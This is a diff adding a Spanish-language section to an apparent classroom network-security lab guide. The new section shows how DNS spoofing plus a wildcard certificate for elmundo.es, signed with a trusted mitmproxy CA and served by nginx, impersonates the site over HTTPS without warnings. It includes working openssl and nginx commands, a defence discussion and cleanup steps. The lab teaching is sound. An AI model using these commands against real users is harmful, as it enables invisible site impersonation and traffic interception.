@@ -362,6 +362,122 @@ Cuando los alumnos abran `elmundo.es` en incógnito verán:
 - ¿Cómo detectaríais que no estáis en el El Mundo real? (IP de destino, DNS autoritativo)
 - ¿Por qué no funciona este ataque con `google.com`? (HSTS preloading: el navegador fuerza HTTPS de forma incondicional)
 
+#### Extensión avanzada (opcional) — HTTPS hijack completo con cert firmado por mitm CA
+
+Hasta acá el demo funciona para HTTP. Si el alumno intenta `https://www.elmundo.es`, el browser muestra un cert warning — incluso **si tiene instalada la CA de mitmproxy del Bloque 2**. Es un punto pedagógico clave: muchos asumen "tengo la CA, todo HTTPS pasa transparente". No funciona así.
+
+**Por qué falla HTTPS con DNS spoof solo:**
+
+Por defecto nginx presenta un cert auto-firmado (`/etc/nginx/ssl/spoof.crt`):
+
+```text
+issuer=CN=192.168.50.1, O=Lab, C=ES    ← NO firmado por mitmproxy CA
+subject=CN=192.168.50.1                ← Hostname mismatch con www.elmundo.es
+```
+
+Dos razones para rechazar:
+1. **Trust chain rota**: la CA de mitmproxy en el browser no firmó este cert.
+2. **Hostname mismatch**: aunque la CA fuera correcta, el CN es `192.168.50.1`, no `www.elmundo.es`.
+
+> "Instalar una CA en el browser solo sirve si los certs que recibís están FIRMADOS por esa CA. La CA no es una llave universal — es una entidad firmante. Si el server presenta un cert firmado por OTRA CA o self-signed, instalar la mitmproxy CA no cambia nada."
+
+**Cómo lograr el hijack HTTPS transparente (sin warning):**
+
+Generar un cert para `*.elmundo.es` firmado por la CA de mitmproxy, y configurarlo en nginx para que se sirva cuando el SNI coincida con elmundo.es. Como Firefox/Chrome ya confían en mitmproxy CA (del Bloque 2), no habrá warning.
+
+```bash
+sudo bash <<'CERT'
+SSL_DIR="/etc/nginx/ssl"
+CA="/root/.mitmproxy/mitmproxy-ca.pem"
+
+cat > /tmp/elmundo.cnf <<'CFG'
+[req]
+distinguished_name=dn
+req_extensions=ext
+prompt=no
+[dn]
+CN=*.elmundo.es
+O=Lab MITM
+C=ES
+[ext]
+subjectAltName=@alt
+keyUsage=digitalSignature,keyEncipherment
+extendedKeyUsage=serverAuth
+[alt]
+DNS.1=elmundo.es
+DNS.2=*.elmundo.es
+CFG
+
+openssl genrsa -out ${SSL_DIR}/elmundo-mitm.key 2048
+openssl req -new -key ${SSL_DIR}/elmundo-mitm.key -out /tmp/elmundo.csr -config /tmp/elmundo.cnf
+openssl x509 -req -in /tmp/elmundo.csr \
+  -CA ${CA} -CAkey ${CA} -CAcreateserial \
+  -out ${SSL_DIR}/elmundo-mitm.crt \
+  -days 365 -sha256 \
+  -extensions ext -extfile /tmp/elmundo.cnf
+chmod 600 ${SSL_DIR}/elmundo-mitm.key
+
+# Append new server block AFTER the default 443 — matched via server_name (SNI)
+cat >> /etc/nginx/sites-available/fake-elmundo <<'NGX'
+
+# === HTTPS hijack: cert signed by mitmproxy CA for elmundo.es ===
+server {
+    listen 443 ssl;
+    server_name elmundo.es www.elmundo.es *.elmundo.es;
+    ssl_certificate     /etc/nginx/ssl/elmundo-mitm.crt;
+    ssl_certificate_key /etc/nginx/ssl/elmundo-mitm.key;
+    root /var/www/fake-elmundo;
+    index index.html;
+    location / { try_files $uri $uri/ /index.html; }
+}
+NGX
+
+nginx -t && systemctl reload nginx
+CERT
+```
+
+**Verificación rápida desde el Pi:**
+
+```bash
+openssl s_client -connect 192.168.50.1:443 -servername www.elmundo.es </dev/null 2>/dev/null \
+  | openssl x509 -noout -issuer -subject
+# Debe mostrar:
+# issuer=CN=mitmproxy, O=mitmproxy
+# subject=CN=*.elmundo.es, O=Lab MITM, C=ES
+```
+
+**El demo final desde el laptop:**
+
+> "Ahora vuestro browser, que confía en la CA de mitmproxy desde el Bloque 2, va a aceptar SIN AVISO el cert que presento para elmundo.es. Mirad."
+
+Alumno navega a `https://www.elmundo.es` en ventana privada de Firefox (con la CA instalada):
+
+- Página falsa de El Mundo cargando vía HTTPS ✓
+- Candado verde ✓
+- Sin warning ✓
+- URL en la barra: `https://www.elmundo.es` ✓
+
+**Punto pedagógico (cierre del bloque):**
+
+> "Lo que acaban de ver es el endgame del operador hostil de red. DNS spoof + cert firmado por una CA que tu sistema confía = hijack TOTAL e INVISIBLE. Sin warnings, sin candado roto, sin nada que les sugiera que están mirando una página falsa."
+>
+> "¿Cuál es la defensa? Tres capas, en orden de fuerza:"
+> 1. **HSTS preload** — el navegador hardcodea ciertos dominios como 'siempre TLS válido'. Esos dominios fallan SIN excepción posible. Ya lo vimos en el Bloque 2 con github.com.
+> 2. **Certificate pinning** (apps móviles) — la app sabe exactamente qué cert esperar, ignora completamente el almacén del sistema. Por eso WhatsApp/banca/Instagram en móvil son inmunes.
+> 3. **Certificate Transparency** — todos los certs emitidos por CAs públicas se publican en logs auditables. Una CA legítima firmando `elmundo.es` para alguien que no es Unidad Editorial sería detectada y revocada — pero la CA de mitmproxy es PRIVADA (no está en CT), entonces para este ataque no aplica. Es defensa contra CAs comprometidas, no contra atacantes que controlan tu trust store.
+>
+> "Conclusión brutal: SI alguien convence a tu sistema de confiar en su CA — vía MDM corporativo, malware, o tú haciendo click sin pensar — tu HTTPS no vale nada para los dominios que no tengan HSTS preload o pinning."
+
+**Limpieza al terminar la extensión:**
+
+```bash
+# Eliminar el server block agregado y los certs generados
+sudo sed -i '/=== HTTPS hijack:/,$d' /etc/nginx/sites-available/fake-elmundo 2>/dev/null || true
+# (alternativa más segura: editar el archivo a mano y borrar el server block añadido)
+sudo rm -f /etc/nginx/ssl/elmundo-mitm.crt /etc/nginx/ssl/elmundo-mitm.key
+sudo nginx -t && sudo systemctl reload nginx
+```
+
 **Al terminar:**
 
 ```bash
